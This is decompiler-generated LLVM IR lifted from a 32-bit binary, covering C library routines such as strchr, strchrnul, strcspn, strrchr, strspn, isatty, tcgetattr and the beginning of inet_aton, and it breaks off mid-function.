declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18544 = urem i32 %arg1, 256
  %v0_185643 = load i32, i32* @r0, align 4
  %v1_185644 = urem i32 %v0_185643, 4
  %v2_185645 = icmp eq i32 %v1_185644, 0
  br i1 %v2_185645, label %dec_label_pc_1856c, label %dec_label_pc_1854c

dec_label_pc_1854c:                               ; preds = %entry, %dec_label_pc_18560
  %v0_18560 = phi i32 [ %v1_18560, %dec_label_pc_18560 ], [ %v0_185643, %entry ]
  %v1_1854c = inttoptr i32 %v0_18560 to i8*
  %v2_1854c = load i8, i8* %v1_1854c, align 1
  %v3_1854c = zext i8 %v2_1854c to i32
  %v9_18550 = icmp eq i32 %v3_1854c, %v1_18544
  br i1 %v9_18550, label %dec_label_pc_18620, label %dec_label_pc_18558

dec_label_pc_18558:                               ; preds = %dec_label_pc_1854c
  %v2_18558 = icmp eq i8 %v2_1854c, 0
  br i1 %v2_18558, label %dec_label_pc_1861c, label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %dec_label_pc_18558
  %v1_18560 = add i32 %v0_18560, 1
  %v1_18564 = urem i32 %v1_18560, 4
  %v2_18564 = icmp eq i32 %v1_18564, 0
  br i1 %v2_18564, label %dec_label_pc_1856c, label %dec_label_pc_1854c

dec_label_pc_1856c:                               ; preds = %dec_label_pc_18560, %entry
  %v0_18570 = phi i32 [ %v0_185643, %entry ], [ %v1_18560, %dec_label_pc_18560 ]
  %v4_1856c = mul nuw nsw i32 %v1_18544, 256
  %v5_1856c = or i32 %v4_1856c, %v1_18544
  %v4_18574 = mul i32 %v5_1856c, 65536
  %v5_18574 = or i32 %v4_18574, %v5_1856c
  br label %dec_label_pc_18578

dec_label_pc_18578:                               ; preds = %dec_label_pc_18614, %dec_label_pc_185b4, %dec_label_pc_1856c
  %v0_185dc = phi i32 [ %v0_18570, %dec_label_pc_1856c ], [ %v4_18578, %dec_label_pc_185b4 ], [ %v4_18578, %dec_label_pc_18614 ]
  %v1_18578 = inttoptr i32 %v0_185dc to i32*
  %v2_18578 = load i32, i32* %v1_18578, align 4
  %v4_18578 = add i32 %v0_185dc, 4
  %v2_18580 = xor i32 %v2_18578, %v5_18574
  %v2_1858c = add i32 %v2_18578, 2130640639
  %v1_18590 = sub i32 -1, %v2_18578
  %v2_18594 = xor i32 %v2_1858c, %v1_18590
  %v2_185a0 = and i32 %v2_18594, -2130640640
  store i32 %v2_185a0, i32* @r1, align 4
  %v2_185a8 = icmp eq i32 %v2_185a0, 0
  br i1 %v2_185a8, label %dec_label_pc_185b4, label %dec_label_pc_185bc

dec_label_pc_185b4:                               ; preds = %dec_label_pc_18578
  %v2_18584 = add i32 %v2_18580, 2130640639
  %v1_1859c = sub i32 -1, %v2_18580
  %v2_185a4 = xor i32 %v2_18584, %v1_1859c
  %v2_185ac = and i32 %v2_185a4, -2130640640
  %v2_185b4 = icmp eq i32 %v2_185ac, 0
  br i1 %v2_185b4, label %dec_label_pc_18578, label %dec_label_pc_185bc

dec_label_pc_185bc:                               ; preds = %dec_label_pc_18578, %dec_label_pc_185b4
  %v2_185bc = inttoptr i32 %v0_185dc to i8*
  %v3_185bc = load i8, i8* %v2_185bc, align 1
  %v4_185bc = zext i8 %v3_185bc to i32
  %v9_185c0 = icmp eq i32 %v4_185bc, %v1_18544
  br i1 %v9_185c0, label %dec_label_pc_18620, label %dec_label_pc_185cc

dec_label_pc_185cc:                               ; preds = %dec_label_pc_185bc
  %v2_185cc = icmp eq i8 %v3_185bc, 0
  br i1 %v2_185cc, label %dec_label_pc_1861c, label %dec_label_pc_185d4

dec_label_pc_185d4:                               ; preds = %dec_label_pc_185cc
  %v1_185d4 = add i32 %v0_185dc, 1
  %v2_185d4 = inttoptr i32 %v1_185d4 to i8*
  %v3_185d4 = load i8, i8* %v2_185d4, align 1
  %v4_185d4 = zext i8 %v3_185d4 to i32
  %v9_185d8 = icmp eq i32 %v4_185d4, %v1_18544
  br i1 %v9_185d8, label %dec_label_pc_18620, label %dec_label_pc_185e4

dec_label_pc_185e4:                               ; preds = %dec_label_pc_185d4
  %v2_185e4 = icmp eq i8 %v3_185d4, 0
  br i1 %v2_185e4, label %dec_label_pc_1861c, label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185e4
  %v1_185ec = add i32 %v0_185dc, 2
  %v2_185ec = inttoptr i32 %v1_185ec to i8*
  %v3_185ec = load i8, i8* %v2_185ec, align 1
  %v4_185ec = zext i8 %v3_185ec to i32
  %v9_185f0 = icmp eq i32 %v4_185ec, %v1_18544
  br i1 %v9_185f0, label %dec_label_pc_18620, label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185ec
  %v2_185fc = icmp eq i8 %v3_185ec, 0
  br i1 %v2_185fc, label %dec_label_pc_1861c, label %dec_label_pc_18604

dec_label_pc_18604:                               ; preds = %dec_label_pc_185fc
  %v1_18604 = add i32 %v0_185dc, 3
  %v2_18604 = inttoptr i32 %v1_18604 to i8*
  %v3_18604 = load i8, i8* %v2_18604, align 1
  %v4_18604 = zext i8 %v3_18604 to i32
  %v9_18608 = icmp eq i32 %v4_18604, %v1_18544
  br i1 %v9_18608, label %dec_label_pc_18620, label %dec_label_pc_18614

dec_label_pc_18614:                               ; preds = %dec_label_pc_18604
  %v2_18614 = icmp eq i8 %v3_18604, 0
  br i1 %v2_18614, label %dec_label_pc_1861c, label %dec_label_pc_18578

dec_label_pc_1861c:                               ; preds = %dec_label_pc_18558, %dec_label_pc_18614, %dec_label_pc_185fc, %dec_label_pc_185e4, %dec_label_pc_185cc
  br label %dec_label_pc_18620

dec_label_pc_18620:                               ; preds = %dec_label_pc_1854c, %dec_label_pc_18604, %dec_label_pc_185ec, %dec_label_pc_185d4, %dec_label_pc_185bc, %dec_label_pc_1861c
  %v1_18624 = phi i32 [ 0, %dec_label_pc_1861c ], [ %v1_18604, %dec_label_pc_18604 ], [ %v1_185ec, %dec_label_pc_185ec ], [ %v1_185d4, %dec_label_pc_185d4 ], [ %v0_185dc, %dec_label_pc_185bc ], [ %v0_18560, %dec_label_pc_1854c ]
  ret i32 %v1_18624

; uselistorder directives
  uselistorder i32 %v4_18578, { 1, 0 }
  uselistorder i32 %v2_18578, { 0, 2, 1 }
  uselistorder i32 %v0_185dc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1856c, { 1, 0 }
  uselistorder i32 %v1_18560, { 1, 0, 2 }
  uselistorder i32 %v0_185643, { 2, 1, 0 }
  uselistorder i32 %v1_18544, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_18620, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1861c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_185bc, { 1, 0 }
  uselistorder label %dec_label_pc_1854c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18634 = urem i32 %arg1, 256
  %v0_186542 = load i32, i32* @r0, align 4
  %v1_186543 = urem i32 %v0_186542, 4
  %v2_186544 = icmp eq i32 %v1_186543, 0
  br i1 %v2_186544, label %dec_label_pc_1865c, label %dec_label_pc_1863c

dec_label_pc_1863c:                               ; preds = %entry, %dec_label_pc_18650
  %v0_18650 = phi i32 [ %v1_18650, %dec_label_pc_18650 ], [ %v0_186542, %entry ]
  %v1_1863c = inttoptr i32 %v0_18650 to i8*
  %v2_1863c = load i8, i8* %v1_1863c, align 1
  %v3_1863c = zext i8 %v2_1863c to i32
  %v9_18640 = icmp eq i32 %v3_1863c, %v1_18634
  br i1 %v9_18640, label %dec_label_pc_1870c, label %dec_label_pc_18648

dec_label_pc_18648:                               ; preds = %dec_label_pc_1863c
  %v2_18648 = icmp eq i8 %v2_1863c, 0
  br i1 %v2_18648, label %dec_label_pc_1870c, label %dec_label_pc_18650

dec_label_pc_18650:                               ; preds = %dec_label_pc_18648
  %v1_18650 = add i32 %v0_18650, 1
  %v1_18654 = urem i32 %v1_18650, 4
  %v2_18654 = icmp eq i32 %v1_18654, 0
  br i1 %v2_18654, label %dec_label_pc_1865c, label %dec_label_pc_1863c

dec_label_pc_1865c:                               ; preds = %dec_label_pc_18650, %entry
  %v0_18660 = phi i32 [ %v0_186542, %entry ], [ %v1_18650, %dec_label_pc_18650 ]
  %v4_1865c = mul nuw nsw i32 %v1_18634, 256
  %v5_1865c = or i32 %v4_1865c, %v1_18634
  %v4_18664 = mul i32 %v5_1865c, 65536
  %v5_18664 = or i32 %v4_18664, %v5_1865c
  br label %dec_label_pc_18668

dec_label_pc_18668:                               ; preds = %dec_label_pc_18704, %dec_label_pc_186a4, %dec_label_pc_1865c
  %v0_186cc = phi i32 [ %v0_18660, %dec_label_pc_1865c ], [ %v4_18668, %dec_label_pc_186a4 ], [ %v4_18668, %dec_label_pc_18704 ]
  %v1_18668 = inttoptr i32 %v0_186cc to i32*
  %v2_18668 = load i32, i32* %v1_18668, align 4
  %v4_18668 = add i32 %v0_186cc, 4
  %v2_18670 = xor i32 %v2_18668, %v5_18664
  %v2_1867c = add i32 %v2_18668, 2130640639
  %v1_18680 = sub i32 -1, %v2_18668
  %v2_18684 = xor i32 %v2_1867c, %v1_18680
  %v2_18690 = and i32 %v2_18684, -2130640640
  store i32 %v2_18690, i32* @r1, align 4
  %v2_18698 = icmp eq i32 %v2_18690, 0
  br i1 %v2_18698, label %dec_label_pc_186a4, label %dec_label_pc_186ac

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18668
  %v2_18674 = add i32 %v2_18670, 2130640639
  %v1_1868c = sub i32 -1, %v2_18670
  %v2_18694 = xor i32 %v2_18674, %v1_1868c
  %v2_1869c = and i32 %v2_18694, -2130640640
  %v2_186a4 = icmp eq i32 %v2_1869c, 0
  br i1 %v2_186a4, label %dec_label_pc_18668, label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %dec_label_pc_18668, %dec_label_pc_186a4
  %v2_186ac = inttoptr i32 %v0_186cc to i8*
  %v3_186ac = load i8, i8* %v2_186ac, align 1
  %v4_186ac = zext i8 %v3_186ac to i32
  %v9_186b0 = icmp eq i32 %v4_186ac, %v1_18634
  br i1 %v9_186b0, label %dec_label_pc_1870c, label %dec_label_pc_186bc

dec_label_pc_186bc:                               ; preds = %dec_label_pc_186ac
  %v2_186bc = icmp eq i8 %v3_186ac, 0
  br i1 %v2_186bc, label %dec_label_pc_1870c, label %dec_label_pc_186c4

dec_label_pc_186c4:                               ; preds = %dec_label_pc_186bc
  %v1_186c4 = add i32 %v0_186cc, 1
  %v2_186c4 = inttoptr i32 %v1_186c4 to i8*
  %v3_186c4 = load i8, i8* %v2_186c4, align 1
  %v4_186c4 = zext i8 %v3_186c4 to i32
  %v9_186c8 = icmp eq i32 %v4_186c4, %v1_18634
  br i1 %v9_186c8, label %dec_label_pc_1870c, label %dec_label_pc_186d4

dec_label_pc_186d4:                               ; preds = %dec_label_pc_186c4
  %v2_186d4 = icmp eq i8 %v3_186c4, 0
  br i1 %v2_186d4, label %dec_label_pc_1870c, label %dec_label_pc_186dc

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186d4
  %v1_186dc = add i32 %v0_186cc, 2
  %v2_186dc = inttoptr i32 %v1_186dc to i8*
  %v3_186dc = load i8, i8* %v2_186dc, align 1
  %v4_186dc = zext i8 %v3_186dc to i32
  %v9_186e0 = icmp eq i32 %v4_186dc, %v1_18634
  br i1 %v9_186e0, label %dec_label_pc_1870c, label %dec_label_pc_186ec

dec_label_pc_186ec:                               ; preds = %dec_label_pc_186dc
  %v2_186ec = icmp eq i8 %v3_186dc, 0
  br i1 %v2_186ec, label %dec_label_pc_1870c, label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186ec
  %v1_186f4 = add i32 %v0_186cc, 3
  %v2_186f4 = inttoptr i32 %v1_186f4 to i8*
  %v3_186f4 = load i8, i8* %v2_186f4, align 1
  %v4_186f4 = zext i8 %v3_186f4 to i32
  %v9_186f8 = icmp eq i32 %v4_186f4, %v1_18634
  br i1 %v9_186f8, label %dec_label_pc_1870c, label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_186f4
  %v2_18704 = icmp eq i8 %v3_186f4, 0
  br i1 %v2_18704, label %dec_label_pc_1870c, label %dec_label_pc_18668

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18648, %dec_label_pc_1863c, %dec_label_pc_18704, %dec_label_pc_186f4, %dec_label_pc_186ec, %dec_label_pc_186dc, %dec_label_pc_186d4, %dec_label_pc_186c4, %dec_label_pc_186bc, %dec_label_pc_186ac
  %v1_18710 = phi i32 [ %v1_186f4, %dec_label_pc_18704 ], [ %v1_186f4, %dec_label_pc_186f4 ], [ %v1_186dc, %dec_label_pc_186ec ], [ %v1_186dc, %dec_label_pc_186dc ], [ %v1_186c4, %dec_label_pc_186d4 ], [ %v1_186c4, %dec_label_pc_186c4 ], [ %v0_186cc, %dec_label_pc_186bc ], [ %v0_186cc, %dec_label_pc_186ac ], [ %v0_18650, %dec_label_pc_1863c ], [ %v0_18650, %dec_label_pc_18648 ]
  ret i32 %v1_18710

; uselistorder directives
  uselistorder i32 %v4_18668, { 1, 0 }
  uselistorder i32 %v2_18668, { 0, 2, 1 }
  uselistorder i32 %v0_186cc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1865c, { 1, 0 }
  uselistorder i32 %v1_18650, { 1, 0, 2 }
  uselistorder i32 %v0_186542, { 2, 1, 0 }
  uselistorder i32 %v1_18634, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1870c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_186ac, { 1, 0 }
  uselistorder label %dec_label_pc_1863c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1871c = load i32, i32* @r4, align 4
  store i32 %v3_1871c, i32* %stack_var_-16, align 4
  %v6_1871c = load i32, i32* @r5, align 4
  %v9_1871c = load i32, i32* @r6, align 4
  %v0_18720 = load i32, i32* @r0, align 4
  %v0_18724 = load i32, i32* @r1, align 4
  store i32 %v0_18724, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_187408 = inttoptr i32 %v0_18720 to i8*
  %v2_187409 = load i8, i8* %v1_187408, align 1
  %v3_1874010 = zext i8 %v2_187409 to i32
  store i32 %v3_1874010, i32* @r1, align 4
  %v2_1874411 = icmp eq i8 %v2_187409, 0
  store i32 %v0_18724, i32* @r0, align 4
  %v1_1874c12 = add i32 %v0_18720, 1
  store i32 %v1_1874c12, i32* @r4, align 4
  br i1 %v2_1874411, label %dec_label_pc_18754, label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %entry, %dec_label_pc_1873c
  %v3_1874014 = phi i32 [ %v3_18740, %dec_label_pc_1873c ], [ %v3_1874010, %entry ]
  %v0_1874813 = phi i32 [ %v0_18748.pre, %dec_label_pc_1873c ], [ %v0_18724, %entry ]
  %v2_18730 = call i32 @__GI_strchr(i32 %v0_1874813, i32 %v3_1874014)
  %v2_18734 = icmp eq i32 %v2_18730, 0
  %v0_1873c = load i32, i32* @r5, align 4
  br i1 %v2_18734, label %dec_label_pc_1873c, label %dec_label_pc_18754

dec_label_pc_1873c:                               ; preds = %dec_label_pc_18730
  %v1_1873c = add i32 %v0_1873c, 1
  %v0_18740.pre = load i32, i32* @r4, align 4
  %v0_18748.pre = load i32, i32* @r6, align 4
  store i32 %v1_1873c, i32* @r5, align 4
  %v1_18740 = inttoptr i32 %v0_18740.pre to i8*
  %v2_18740 = load i8, i8* %v1_18740, align 1
  %v3_18740 = zext i8 %v2_18740 to i32
  store i32 %v3_18740, i32* @r1, align 4
  %v2_18744 = icmp eq i8 %v2_18740, 0
  store i32 %v0_18748.pre, i32* @r0, align 4
  %v1_1874c = add i32 %v0_18740.pre, 1
  store i32 %v1_1874c, i32* @r4, align 4
  br i1 %v2_18744, label %dec_label_pc_18754, label %dec_label_pc_18730

dec_label_pc_18754:                               ; preds = %dec_label_pc_1873c, %dec_label_pc_18730, %entry
  %v0_18754 = phi i32 [ 0, %entry ], [ %v0_1873c, %dec_label_pc_18730 ], [ %v1_1873c, %dec_label_pc_1873c ]
  %v2_18758 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18758, i32* @r4, align 4
  store i32 %v6_1871c, i32* @r5, align 4
  store i32 %v9_1871c, i32* @r6, align 4
  ret i32 %v0_18754

; uselistorder directives
  uselistorder i32 %v3_18740, { 1, 0 }
  uselistorder i32 %v0_18748.pre, { 1, 0 }
  uselistorder i32 %v0_18740.pre, { 1, 0 }
  uselistorder label %dec_label_pc_18730, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_18764 = urem i32 %arg2, 256
  store i32 %v1_18764, i32* @r4, align 4
  %v2_18764 = icmp eq i32 %v1_18764, 0
  br i1 %v2_18764, label %dec_label_pc_18778, label %dec_label_pc_1878c.preheader

dec_label_pc_1878c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_187943 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_18764)
  %v2_187985 = icmp eq i32 %v2_187943, 0
  br i1 %v2_187985, label %dec_label_pc_187a0, label %dec_label_pc_18784

dec_label_pc_18778:                               ; preds = %entry
  %v2_1877c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_187a4

dec_label_pc_18784:                               ; preds = %dec_label_pc_1878c.preheader, %dec_label_pc_18784
  %v2_187946 = phi i32 [ %v2_18794, %dec_label_pc_18784 ], [ %v2_187943, %dec_label_pc_1878c.preheader ]
  store i32 %v2_187946, i32* @r5, align 4
  %v1_18788 = add i32 %v2_187946, 1
  store i32 %v1_18788, i32* @r0, align 4
  %v0_18790 = load i32, i32* @r4, align 4
  %v2_18794 = call i32 @__GI_strchr(i32 %v1_18788, i32 %v0_18790)
  %v2_18798 = icmp eq i32 %v2_18794, 0
  br i1 %v2_18798, label %dec_label_pc_187a0, label %dec_label_pc_18784

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18784, %dec_label_pc_1878c.preheader
  %v0_187a0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_187a4

dec_label_pc_187a4:                               ; preds = %dec_label_pc_18778, %dec_label_pc_187a0
  %storemerge = phi i32 [ %v2_1877c, %dec_label_pc_18778 ], [ %v0_187a0, %dec_label_pc_187a0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_18794, { 1, 0 }
  uselistorder i32 %v1_18788, { 1, 0 }
  uselistorder i32 %v1_18764, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_187a4, { 1, 0 }
  uselistorder label %dec_label_pc_18784, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_187e02 = load i32, i32* @r0, align 4
  %v1_187e03 = inttoptr i32 %v0_187e02 to i8*
  %v2_187e04 = load i8, i8* %v1_187e03, align 1
  %v2_187e46 = icmp eq i8 %v2_187e04, 0
  br i1 %v2_187e46, label %dec_label_pc_187f0, label %dec_label_pc_187c4.preheader

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187c4
  %v1_187cc = add i32 %v0_187cc, 1
  %v9_187bc = icmp eq i8 %v0_187bc10.in, %v2_187c4
  br i1 %v9_187bc, label %dec_label_pc_187d8, label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_187c4.preheader, %dec_label_pc_187bc
  %v0_187cc = phi i32 [ %tmp, %dec_label_pc_187c4.preheader ], [ %v1_187cc, %dec_label_pc_187bc ]
  %v1_187c4 = inttoptr i32 %v0_187cc to i8*
  %v2_187c4 = load i8, i8* %v1_187c4, align 1
  %v2_187c8 = icmp eq i8 %v2_187c4, 0
  br i1 %v2_187c8, label %dec_label_pc_187f0, label %dec_label_pc_187bc

dec_label_pc_187d8:                               ; preds = %dec_label_pc_187bc
  %v1_187d8 = add i32 %v0_187d8, 1
  %v1_187dc = add i32 %v0_187dc, 1
  %v1_187e0 = inttoptr i32 %v1_187dc to i8*
  %v2_187e0 = load i8, i8* %v1_187e0, align 1
  %v2_187e4 = icmp eq i8 %v2_187e0, 0
  br i1 %v2_187e4, label %dec_label_pc_187f0, label %dec_label_pc_187c4.preheader

dec_label_pc_187c4.preheader:                     ; preds = %entry, %dec_label_pc_187d8
  %v0_187dc = phi i32 [ %v1_187dc, %dec_label_pc_187d8 ], [ %v0_187e02, %entry ]
  %v0_187d8 = phi i32 [ %v1_187d8, %dec_label_pc_187d8 ], [ 0, %entry ]
  %v0_187bc10.in = phi i8 [ %v2_187e0, %dec_label_pc_187d8 ], [ %v2_187e04, %entry ]
  br label %dec_label_pc_187c4

dec_label_pc_187f0:                               ; preds = %dec_label_pc_187d8, %dec_label_pc_187c4, %entry
  %v0_187f0 = phi i32 [ 0, %entry ], [ %v0_187d8, %dec_label_pc_187c4 ], [ %v1_187d8, %dec_label_pc_187d8 ]
  ret i32 %v0_187f0

; uselistorder directives
  uselistorder i8 %v2_187c4, { 1, 0 }
  uselistorder i32 %v0_187cc, { 1, 0 }
  uselistorder label %dec_label_pc_187c4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_18804 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_18804, i32* @r1, align 4
  %v0_18808 = call i32 @__GI_tcgetattr()
  %v1_1880c = sub i32 1, %v0_18808
  %v2_1880c = icmp ult i32 %v0_18808, 2
  br i1 %v2_1880c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1881c = phi i32 [ %v1_1880c, %entry ], [ 0, %bb ]
  ret i32 %v1_1881c

; uselistorder directives
  uselistorder i32 %v0_18808, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_18820 = load i32, i32* @r4, align 4
  %v6_18820 = load i32, i32* @r5, align 4
  %v9_18820 = load i32, i32* @r6, align 4
  %v2_18828 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1882c = load i32, i32* @r1, align 4
  store i32 %v0_1882c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_18838 = load i32, i32* @r0, align 4
  %v3_18838 = call i32 @ioctl(i32 %v0_18838, i32 21505, i32 %v2_18828)
  store i32 %v3_18838, i32* %r0.global-to-local, align 4
  store i32 %v3_18838, i32* @r5, align 4
  %v2_1883c = icmp eq i32 %v3_18838, 0
  br i1 %v2_1883c, label %dec_label_pc_18844, label %dec_label_pc_18888

dec_label_pc_18844:                               ; preds = %entry
  %v4_18850 = zext i8 %tmp to i32
  store i32 %v4_18850, i32* @ip, align 4
  %v3_18854 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_18854, i32* @r3, align 4
  %v1_18858 = load i32, i32* @r4, align 4
  %v2_18858 = add i32 %v1_18858, 4
  %v3_18858 = inttoptr i32 %v2_18858 to i32*
  %v0_1885c = load i32, i32* %r1.global-to-local, align 4
  %v1_1885c = load i32, i32* @r4, align 4
  %v2_1885c = add i32 %v1_1885c, 8
  %v3_1885c = inttoptr i32 %v2_1885c to i32*
  store i32 %v0_1885c, i32* %v3_1885c, align 4
  %v0_18860 = load i32, i32* %r0.global-to-local, align 4
  %v1_18860 = load i32, i32* @r4, align 4
  %v2_18860 = add i32 %v1_18860, 12
  %v3_18860 = inttoptr i32 %v2_18860 to i32*
  store i32 %v0_18860, i32* %v3_18860, align 4
  %v2_18864 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_18864, i32* @r1, align 4
  %v1_1886c = load i32, i32* @r4, align 4
  %v2_1886c = inttoptr i32 %v1_1886c to i32*
  store i32 %v3_18854, i32* %v2_1886c, align 4
  %v0_18870 = load i32, i32* @ip, align 4
  %v1_18870 = trunc i32 %v0_18870 to i8
  %v2_18870 = load i32, i32* @r4, align 4
  %v3_18870 = add i32 %v2_18870, 16
  %v4_18870 = inttoptr i32 %v3_18870 to i8*
  store i8 %v1_18870, i8* %v4_18870, align 1
  %v0_18874 = load i32, i32* @r4, align 4
  %v1_18874 = add i32 %v0_18874, 17
  store i32 %v1_18874, i32* %r0.global-to-local, align 4
  %v4_18878 = call i32 @__GI_mempcpy(i32 %v1_18874, i32 %v2_18864, i32 19, i32 %v3_18854)
  store i32 %v4_18878, i32* %r0.global-to-local, align 4
  %v0_1887c = load i32, i32* @r5, align 4
  store i32 %v0_1887c, i32* %r1.global-to-local, align 4
  %v3_18884 = inttoptr i32 %v4_18878 to i8*
  %v4_18884 = call i32 @__GI_memset(i8* %v3_18884, i32 %v0_1887c, i32 13)
  store i32 %v4_18884, i32* %r0.global-to-local, align 4
  %v0_18888.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18888

dec_label_pc_18888:                               ; preds = %entry, %dec_label_pc_18844
  %v0_18888 = phi i32 [ %v3_18838, %entry ], [ %v0_18888.pre, %dec_label_pc_18844 ]
  store i32 %v0_18888, i32* %r0.global-to-local, align 4
  store i32 %v3_18820, i32* @r4, align 4
  store i32 %v6_18820, i32* @r5, align 4
  store i32 %v9_18820, i32* @r6, align 4
  ret i32 %v0_18888

; uselistorder directives
  uselistorder i32 %v0_18888, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 11, 1, 2, 12, 13, 3, 14, 4, 15, 5, 16, 6, 17, 18, 19, 7, 20, 8, 9, 21, 10, 22, 23, 24, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18888, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1889c = load i32, i32* @r4, align 4
  store i32 %v3_1889c, i32* %stack_var_-28, align 4
  %v0_188a4 = load i32, i32* @r0, align 4
  %v2_188a4 = icmp eq i32 %v0_188a4, 0
  %v0_188ac = load i32, i32* @r1, align 4
  br i1 %v2_188a4, label %dec_label_pc_18980, label %dec_label_pc_188b4

dec_label_pc_188b4:                               ; preds = %entry
  br label %dec_label_pc_188cc

dec_label_pc_188cc:                               ; preds = %dec_label_pc_188b4, %dec_label_pc_18944
  %v1_18944 = phi i32 [ 0, %dec_label_pc_188b4 ], [ %v5_18944, %dec_label_pc_18944 ]
  %v0_18948 = phi i32 [ 1, %dec_label_pc_188b4 ], [ %v1_18948, %dec_label_pc_18944 ]
  %v0_188cc = phi i32 [ %v0_188a4, %dec_label_pc_188b4 ], [ %v0_188cc14, %dec_label_pc_18944 ]
  %v1_188cc = inttoptr i32 %v0_188cc to i8*
  %v2_188cc = load i8, i8* %v1_188cc, align 1
  %v3_188cc = zext i8 %v2_188cc to i32
  %v4_188d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 276) to i32*), align 4
  %v2_188d4 = mul nuw nsw i32 %v3_188cc, 2
  %v2_188d8 = add i32 %v2_188d4, %v4_188d0
  %v3_188d8 = inttoptr i32 %v2_188d8 to i16*
  %v4_188d8 = load i16, i16* %v3_188d8, align 2
  %v1_188dc = and i16 %v4_188d8, 8
  %v2_188dc = icmp eq i16 %v1_188dc, 0
  br i1 %v2_188dc, label %dec_label_pc_18980, label %dec_label_pc_188e4

dec_label_pc_188e4:                               ; preds = %dec_label_pc_188cc
  br label %dec_label_pc_18904

dec_label_pc_188ec:                               ; preds = %dec_label_pc_18904
  %v2_188ec = mul i32 %v0_18944, 10
  %v1_188f0 = add i32 %v2_188ec, -48
  %v2_188f4 = add i32 %v3_18904, %v1_188f0
  %v8_188fc = icmp sgt i32 %v2_188f4, 255
  br i1 %v8_188fc, label %dec_label_pc_18980, label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %dec_label_pc_188ec
  %v1_18900 = add i32 %v0_18934, 1
  store i32 %v1_18900, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18904

dec_label_pc_18904:                               ; preds = %dec_label_pc_188e4, %dec_label_pc_18900
  %v0_18944 = phi i32 [ 0, %dec_label_pc_188e4 ], [ %v2_188f4, %dec_label_pc_18900 ]
  %v0_18934 = phi i32 [ %v0_188cc, %dec_label_pc_188e4 ], [ %v1_18900, %dec_label_pc_18900 ]
  %v1_18904 = inttoptr i32 %v0_18934 to i8*
  %v2_18904 = load i8, i8* %v1_18904, align 1
  %v3_18904 = zext i8 %v2_18904 to i32
  %v2_18908 = mul nuw nsw i32 %v3_18904, 2
